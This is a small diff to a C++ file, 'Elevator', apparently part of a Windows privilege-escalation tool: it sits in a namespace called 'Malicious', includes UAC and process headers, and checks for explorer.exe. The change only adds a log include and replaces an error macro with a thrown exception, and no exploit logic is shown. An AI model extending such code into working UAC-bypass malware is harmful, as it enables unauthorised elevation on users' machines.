@@ -1,6 +1,8 @@
 #include "Elevator.hpp"
 #include "BinaryRessource.hpp"
 
+#include <common/Log.hpp>
+
 #include <system/System.hpp>
 #include <system/Uac.hpp>
 #include <system/Process.hpp>
@@ -50,7 +52,7 @@ namespace Malicious
 					}
 					else
 					{
-						FATAL_ERROR("Process explorer.exe does not exist");
+						throw Common::Exception("Process explorer.exe does not exist");
 					}
     				
                     System::Process::This thisProcess;
